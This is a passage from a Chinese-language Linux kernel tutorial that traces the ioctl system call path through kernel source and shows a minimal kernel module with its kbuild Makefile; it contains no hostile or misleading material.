class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">	<span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">			  <span class="type">loff_t</span> len);</span><br><span class="line">	<span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">	<span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">	<span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">			<span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">	<span class="type">loff_t</span> (*remap_file_range)(<span class="keyword">struct</span> file *file_in, <span class="type">loff_t</span> pos_in,</span><br><span class="line">				   <span class="keyword">struct</span> file *file_out, <span class="type">loff_t</span> pos_out,</span><br><span class="line">				   <span class="type">loff_t</span> len, <span class="type">unsigned</span> <span class="type">int</span> remap_flags);</span><br><span class="line">	<span class="type">int</span> (*fadvise)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure></div>

<p>通常我们可以通过文件处理函数如 <code>read</code>、<code>write</code> 等对文件进行操作。但是设备类的文件常常有一些自定义的功能，这些功能不太容易通过文件操作函数进行描述，我们通常会注册其中的 <code>unlocked_ioctl</code> 函数（对应 <code>ioctl</code> 系统调用）然后传递功能号和自定义参数来进行交互。</p>
<blockquote>
<ul>
<li><code>unlocked_ioctl</code> 用于处理设备的 <code>ioctl</code> 操作。它处理的是标准的 <code>ioctl</code> 请求，通常在 64 位系统上运行时使用。</li>
<li><code>compat_ioctl</code> 用于处理来自 32 位用户空间程序的 <code>ioctl</code> 请求。在 64 位系统上，如果 <code>ioctl</code> 请求来自 32 位程序，它将调用 <code>compat_ioctl</code> 来处理请求。</li>
</ul>
</blockquote>
<p><code>ioctl</code>（输入&#x2F;输出控制，Input&#x2F;Output Control）函数是一个在 Unix-like 操作系统中常用的系统调用，用于设备控制。通过 <code>ioctl</code>，用户程序可以向设备驱动程序发送控制命令，以执行特殊的硬件操作或获取设备的状态信息。<code>ioctl</code> 函数在设备文件的操作中扮演了重要角色，尤其是在一些不符合标准文件操作（如读写操作）时，能够提供额外的控制功能。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ioctl</span><span class="params">(<span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">long</span> request, ...)</span>;</span><br></pre></td></tr></table></figure></div>

<ul>
<li>**<code>fd</code>**：文件描述符，表示一个已经打开的设备文件。你需要通过 <code>open</code> 系统调用打开设备文件来获取该文件描述符。</li>
<li>**<code>request</code>**：控制命令，指定操作的类型。每个设备驱动会定义自己支持的命令，这些命令通常是宏定义的常量。</li>
<li>**<code>...</code>**：根据 <code>request</code> 命令的不同，<code>ioctl</code> 可能会接受额外的参数。具体参数的数量和类型取决于 <code>request</code> 所需的控制命令。</li>
</ul>
<p>当用户程序调用 <code>ioctl</code> 系统调用时，内核调用栈如下：</p>
<pre><font color="#26A269"><b>pwndbg&gt; </b></font>bt
#0  <font color="#A2734C">my_ioctl</font> (<font color="#2AA1B3">file</font>=0xffff888103392500, <font color="#2AA1B3">cmd</font>=1, <font color="#2AA1B3">arg</font>=140730326886248) at <font color="#26A269">/home/ubuntu/Desktop/my_module/main.c</font>:21
#1  <font color="#12488B">0xffffffff813d91dd</font> in <font color="#A2734C">vfs_ioctl</font> (<font color="#2AA1B3">arg</font>=140730326886248, <font color="#2AA1B3">cmd</font>=&lt;optimized out&gt;, <font color="#2AA1B3">filp</font>=0xffff888103392500) at <font color="#26A269">fs/ioctl.c</font>:51
#2  <font color="#A2734C">__do_sys_ioctl</font> (<font color="#2AA1B3">arg</font>=140730326886248, <font color="#2AA1B3">cmd</font>=&lt;optimized out&gt;, <font color="#2AA1B3">fd</font>=&lt;optimized out&gt;) at <font color="#26A269">fs/ioctl.c</font>:874
#3  <font color="#A2734C">__se_sys_ioctl</font> (<font color="#2AA1B3">arg</font>=140730326886248, <font color="#2AA1B3">cmd</font>=&lt;optimized out&gt;, <font color="#2AA1B3">fd</font>=&lt;optimized out&gt;) at <font color="#26A269">fs/ioctl.c</font>:860
#4  <font color="#A2734C">__x64_sys_ioctl</font> (<font color="#2AA1B3">regs</font>=&lt;optimized out&gt;) at <font color="#26A269">fs/ioctl.c</font>:860
#5  <font color="#12488B">0xffffffff81eb11cc</font> in <font color="#A2734C">do_syscall_x64</font> (<font color="#2AA1B3">nr</font>=&lt;optimized out&gt;, <font color="#2AA1B3">regs</font>=0xffffc90000587f58) at <font color="#26A269">arch/x86/entry/common.c</font>:50
#6  <font color="#A2734C">do_syscall_64</font> (<font color="#2AA1B3">regs</font>=0xffffc90000587f58, <font color="#2AA1B3">nr</font>=&lt;optimized out&gt;) at <font color="#26A269">arch/x86/entry/common.c</font>:80
#7  <font color="#12488B">0xffffffff8200007c</font> in <font color="#A2734C">entry_SYSCALL_64</font> () at <font color="#26A269">arch/x86/entry/entry_64.S</font>:113
</pre>

<p><code>ioctl</code> 函数会调用到 <code>ksys_ioctl</code> 函数，该函数度调用的 <code>fdget</code> 会通过 <code>task_struct-&gt;files_struct</code> 的文件描述符表找到传入的句柄对应 <code>file</code> 结构体。之后将 <code>file</code> 结构体指针作为参数调用 <code>do_vfs_ioctl</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">fd</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">ksys_ioctl</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> error;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fd</span> <span class="title">f</span> =</span> fdget(fd); <span class="comment">// 获取 fd 对应的 file 结构体</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!f.file)</span><br><span class="line">		<span class="keyword">return</span> -EBADF;</span><br><span class="line">	error = security_file_ioctl(f.file, cmd, arg);</span><br><span class="line">	<span class="keyword">if</span> (!error)</span><br><span class="line">		error = do_vfs_ioctl(f.file, fd, cmd, arg); <span class="comment">// &lt;---</span></span><br><span class="line">	fdput(f);</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SYSCALL_DEFINE3(ioctl, <span class="type">unsigned</span> <span class="type">int</span>, fd, <span class="type">unsigned</span> <span class="type">int</span>, cmd, <span class="type">unsigned</span> <span class="type">long</span>, arg)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> ksys_ioctl(fd, cmd, arg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>do_vfs_ioctl</code> 中会针对一些特殊的功能号做一些特殊的处理，否则对于设备文件会调用 <code>vfs_ioctl</code> 函数。<strong>这里要注意我们自定义的功能号不能与这些特殊的功能号重合，否则不能调到我们自己注册的 <code>ioctl</code> 函数。</strong></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * 当你在上面和下面的 switch 语句中添加任何新的常见 ioctl 命令时，</span></span><br><span class="line"><span class="comment"> * 请同时更新 compat_sys_ioctl()。</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * do_vfs_ioctl() 不是为驱动程序设计的，也不打算被 EXPORT_SYMBOL() 导出。</span></span><br><span class="line"><span class="comment"> * 它只是 sys_ioctl 和 compat_sys_ioctl 的简单辅助函数。</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">do_vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> fd, <span class="type">unsigned</span> <span class="type">int</span> cmd,</span></span><br><span class="line"><span class="params">	     <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> error = <span class="number">0</span>;    <span class="comment">// 错误码，初始化为 0，表示成功</span></span><br><span class="line">    <span class="type">int</span> __user *argp = (<span class="type">int</span> __user *)arg;   <span class="comment">// 用于指向用户空间传递的参数</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(filp);  <span class="comment">// 获取文件的 inode 信息</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据 cmd 的不同值，执行不同的操作</span></span><br><span class="line">    <span class="keyword">switch</span> (cmd) &#123;</span><br><span class="line">    <span class="keyword">case</span> FIOCLEX: <span class="comment">// 0x5451</span></span><br><span class="line">        <span class="comment">// 设置文件描述符 fd 为执行时关闭（close-on-exec）标志</span></span><br><span class="line">        set_close_on_exec(fd, <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIONCLEX: <span class="comment">// 0x5450</span></span><br><span class="line">        <span class="comment">// 取消文件描述符 fd 的执行时关闭（close-on-exec）标志</span></span><br><span class="line">        set_close_on_exec(fd, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIONBIO: <span class="comment">// 0x5421</span></span><br><span class="line">        <span class="comment">// 设置文件描述符为非阻塞模式</span></span><br><span class="line">        error = ioctl_fionbio(filp, argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIOASYNC: <span class="comment">// 0x5452</span></span><br><span class="line">        <span class="comment">// 设置异步 I/O 模式</span></span><br><span class="line">        error = ioctl_fioasync(fd, filp, argp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIOQSIZE: <span class="comment">// 0x5460</span></span><br><span class="line">        <span class="comment">// 获取文件的大小，支持的文件类型是普通文件、符号链接和目录</span></span><br><span class="line">        <span class="keyword">if</span> (S_ISDIR(inode-&gt;i_mode) || S_ISREG(inode-&gt;i_mode) ||</span><br><span class="line">            S_ISLNK(inode-&gt;i_mode)) &#123;</span><br><span class="line">            <span class="type">loff_t</span> res = inode_get_bytes(inode);   <span class="comment">// 获取文件的字节大小</span></span><br><span class="line">            error = copy_to_user(argp, &amp;res, <span class="keyword">sizeof</span>(res)) ?</span><br><span class="line">                    -EFAULT : <span class="number">0</span>;    <span class="comment">// 将结果复制到用户空间</span></span><br><span class="line">        &#125; <span class="keyword">else</span></span><br><span class="line">            error = -ENOTTY;   <span class="comment">// 如果不是支持的文件类型，返回 -ENOTTY 错误</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIFREEZE: <span class="comment">// 0xC0045877</span></span><br><span class="line">        <span class="comment">// 冻结文件系统</span></span><br><span class="line">        error = ioctl_fsfreeze(filp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FITHAW: <span class="comment">// 0xC0045878</span></span><br><span class="line">        <span class="comment">// 解冻文件系统</span></span><br><span class="line">        error = ioctl_fsthaw(filp);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FS_IOC_FIEMAP: <span class="comment">// 0xC020660B</span></span><br><span class="line">        <span class="comment">// 文件系统的 FIEMAP IOCTL，用于获取文件的物理块映射</span></span><br><span class="line">        <span class="keyword">return</span> ioctl_fiemap(filp, arg);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIGETBSZ: <span class="comment">// 0x2</span></span><br><span class="line">        <span class="comment">// 获取文件系统块大小</span></span><br><span class="line">        <span class="comment">/* anon_bdev 文件系统可能没有块大小 */</span></span><br><span class="line">        <span class="keyword">if</span> (!inode-&gt;i_sb-&gt;s_blocksize)   <span class="comment">// 如果文件系统没有块大小，返回 -EINVAL</span></span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        <span class="keyword">return</span> put_user(inode-&gt;i_sb-&gt;s_blocksize, argp);  <span class="comment">// 将块大小返回给用户空间</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FICLONE: <span class="comment">// 0x40049409</span></span><br><span class="line">        <span class="comment">// 用于克隆文件</span></span><br><span class="line">        <span class="keyword">return</span> ioctl_file_clone(filp, arg, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FICLONERANGE: <span class="comment">// 0x4020940D</span></span><br><span class="line">        <span class="comment">// 用于克隆文件的一部分</span></span><br><span class="line">        <span class="keyword">return</span> ioctl_file_clone_range(filp, argp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> FIDEDUPERANGE: <span class="comment">// 0xC0189436</span></span><br><span class="line">        <span class="comment">// 用于去重文件的一部分</span></span><br><span class="line">        <span class="keyword">return</span> ioctl_file_dedupe_range(filp, argp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="comment">// 如果是普通文件，则调用 file_ioctl 处理</span></span><br><span class="line">        <span class="keyword">if</span> (S_ISREG(inode-&gt;i_mode))</span><br><span class="line">            error = file_ioctl(filp, cmd, arg);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">// 否则调用 vfs_ioctl 处理</span></span><br><span class="line">            error = vfs_ioctl(filp, cmd, arg);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> error;   <span class="comment">// 返回错误码，0表示成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>之后在 <code>vfs_ioctl</code> 函数会调用 <code>file</code> 结构体的 <code>f_op</code> 函数表中的 <code>unlocked_ioctl</code> 函数，进而调用到模块注册的 <code>my_ioctl</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">long</span> <span class="title function_">vfs_ioctl</span><span class="params">(<span class="keyword">struct</span> file *filp, <span class="type">unsigned</span> <span class="type">int</span> cmd, <span class="type">unsigned</span> <span class="type">long</span> arg)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> error = -ENOTTY;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!filp-&gt;f_op-&gt;unlocked_ioctl)</span><br><span class="line">		<span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">	error = filp-&gt;f_op-&gt;unlocked_ioctl(filp, cmd, arg);</span><br><span class="line">	<span class="keyword">if</span> (error == -ENOIOCTLCMD)</span><br><span class="line">		error = -ENOTTY;</span><br><span class="line"> out:</span><br><span class="line">	<span class="keyword">return</span> error;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="内核模块环境基础"><a href="#内核模块环境基础" class="headerlink" title="内核模块环境基础"></a>内核模块环境基础</h2><h3 id="内核模块开发库"><a href="#内核模块开发库" class="headerlink" title="内核模块开发库"></a>内核模块开发库</h3><p>内核模块通常是用 C 语言编写的，并且不依赖标准库（如 libc）。</p>
<p>因此如果针对发行版 Linux 系统开发内核模块需要我们安装相关的开发库。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> apt-get install linux-headers-$(<span class="built_in">uname</span> -r)  <span class="comment"># 适用于 Debian/Ubuntu 系统</span></span><br></pre></td></tr></table></figure></div>

<p>另外如果是针对自己编译的简易 Linux 环境开发内核模块，则只需要有内核源码即可。然而编译内核模块的时候需要一些相关的依赖库，因此需要将内核源码的模块部分编译一遍。</p>
<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make modules -j$(<span class="built_in">nproc</span>)</span><br></pre></td></tr></table></figure></div>

<h3 id="内核模块代码基本组成"><a href="#内核模块代码基本组成" class="headerlink" title="内核模块代码基本组成"></a>内核模块代码基本组成</h3><p>一个最基本的内核模块代码 <code>my_module.c</code> 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>); <span class="comment">// 模块的许可证</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 模块加载时执行的函数</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">my_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, Linux Kernel!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>; <span class="comment">// 返回 0 表示加载成功</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 模块卸载时执行的函数</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">my_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, Linux Kernel!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义模块的入口和出口函数</span></span><br><span class="line">module_init(my_module_init);</span><br><span class="line">module_exit(my_module_exit);</span><br></pre></td></tr></table></figure></div>

<h4 id="模块的许可证"><a href="#模块的许可证" class="headerlink" title="模块的许可证"></a>模块的许可证</h4><p>Linux 内核是根据 GNU General Public License (GPL) 发行的开源软件。为了保护内核的开源性质，Linux 内核对模块的许可证有严格的检查机制。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>如果模块没有声明 <code>MODULE_LICENSE(&quot;GPL&quot;)</code> 则编译或时会失败。</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR: modpost: missing MODULE_LICENSE()</span><br></pre></td></tr></table></figure></div>

<h4 id="加载和卸载函数"><a href="#加载和卸载函数" class="headerlink" title="加载和卸载函数"></a>加载和卸载函数</h4><p>加载和卸载函数分别用于初始化模块资源（如内存分配、硬件配置）和释放资源、清理状态。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">my_module_init</span><span class="params">(<span class="type">void</span>)</span> &#123; ... &#125;</span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">my_module_exit</span><span class="params">(<span class="type">void</span>)</span> &#123; ... &#125;</span><br></pre></td></tr></table></figure></div>

<p>这些函数需要通过 <code>module_init</code> 和 <code>module_exit</code> 宏注册到 <code>.init.text</code> 和 <code>.exit.text</code> 段中，这样该内核模块加载和卸载的时候会分别调用 <code>my_module_init</code> 和 <code>my_module_exit</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_init(my_module_init);</span><br><span class="line">module_exit(my_module_exit);</span><br></pre></td></tr></table></figure></div>

<h3 id="内核模块编译脚本"><a href="#内核模块编译脚本" class="headerlink" title="内核模块编译脚本"></a>内核模块编译脚本</h3><p><code>kbuild</code> 是 Linux 内核的<strong>构建系统</strong>，它负责管理和构建内核及内核模块的编译过程。<code>kbuild</code> 并不是一个独立的工具，而是 Linux 内核构建的一部分。它在内核源代码树中作为一个“中央编译系统”工作，帮助开发者构建内核和模块。</p>
<p>内核的源代码树由多个目录组成，其中每个子目录都可以包含一个 <code>Kbuild</code> 文件，用来描述该目录下的构建规则。<code>kbuild</code> 系统会根据这些规则，编译目标文件并将其链接成内核模块或内核映像。</p>
<p>为了能够构建自己的内核模块，我们需要编写一个 Makefile 文件来告诉 <code>kbuild</code> 如何编译模块，并提供必要的编译选项。</p>

  <div class="note-large blue">
    <div class="notel-title rounded-t-lg p-3 font-bold text-lg flex flex-row gap-2 items-center">
      <p>提示</p>

    </div>
    <div class="notel-content">
      <p><code>make</code> 是一个通用的构建工具，它可以用来处理任何项目的构建任务，包括内核模块、用户空间程序等。<code>make</code> 在 Linux 内核模块的编译过程中有一些特殊的功能和行为。<strong>编译内核模块时，<code>make</code> 会调用 <code>kbuild</code> 提供的规则来管理编译任务</strong>，而不是自身指定编译模块的规则。</p>

    </div>
  </div>

<p>构建内核模块的常用 Makefile 脚本如下：</p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">MODULE_NAME ?= my_module</span><br><span class="line"></span><br><span class="line">obj-m += <span class="variable">$(MODULE_NAME)</span>.o</span><br><span class="line"></span><br><span class="line"><span class="variable">$(MODULE_NAME)</span>-y := main.o</span><br><span class="line"></span><br><span class="line"><span class="comment">#KERNELDR := /lib/modules/$(shell uname -r)/build/</span></span><br><span class="line">KERNELDR := /home/ubuntu/Desktop/linux-5.17</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNELDR)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure></div>

<p>解释一下这个编译脚本的一些细节：</p>
<ul>
<li><p><code>MODULE_NAME ?= my_module</code>：设置模块的名称为 <code>my_module</code>，这样最后编译出来的模块为 <code>my_module.ko</code>。</p>
<p>另外这里的 <code>?=</code> 运算符是为了给 <code>MODULE_NAME</code> 赋默认值 <code>my_module</code>，如果 <code>MODULE_NAME</code> 有值则不会覆盖原本的值，因此可以像下面这样在指定模块名称编译。</p>
  <div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MODULE_NAME=&lt;module_name&gt; make</span><br></pre></td></tr></table></figure></div>
</li>
<li><p><code>obj-m += $(MODULE_NAME).o</code></p>
<ul>
<li><code>obj-m</code>：在 Linux 内核的构建系统中，<code>obj-m</code> 是一个特定的变量，用于告诉内核构建系统哪些目标文件需要被编译成 <strong>内核模块</strong>。另外还有 <code>obj-y</code> 表示将内核模块编译到内核镜像中，<code>obj-n</code> 表示不编译。</li>
<li><code>+= $(MODULE_NAME).o</code>：<code>+=</code> 是一个追加赋值操作符，表示将右边的内容添加到左边的变量中。换句话说，<code>+=</code> 会将指定的目标文件添加到 <code>obj-m</code> 变量的当前值中。<code>obj-m</code> 是一个 <strong>“模块目标”</strong> 列表，它指定了需要编译成模块的目标文件（<code>.o</code> 文件）。对于模块文件，<code>obj-m</code> 会指示 <code>kbuild</code> 系统将这些 <code>.o</code> 文件链接为 <code>.ko</code> 文件，<code>.ko</code> 是内核模块的扩展名（即 “Kernel Object”）。</li>
</ul>
</li>
<li><p><code>$(MODULE_NAME)-y := main.o</code>：编译该内核模块所需要的文件，例如这里我们需要 <code>main.c</code> ，那么我们就在该变量中添加 <code>main.o</code>。</p>
</li>
<li><p><code>KERNELDR</code>：指定了开发环境路径，可以是内核源码也可以是按照的内核头文件库。不过内核源码需要实现编译一遍模块。</p>
</li>
<li><p>最后就是具体的编译命令了，例如 <code>$(MAKE) -C $(KERNELDR) M=$(PWD) modules</code> 这条编译命令有如下解释：</p>
<ul>
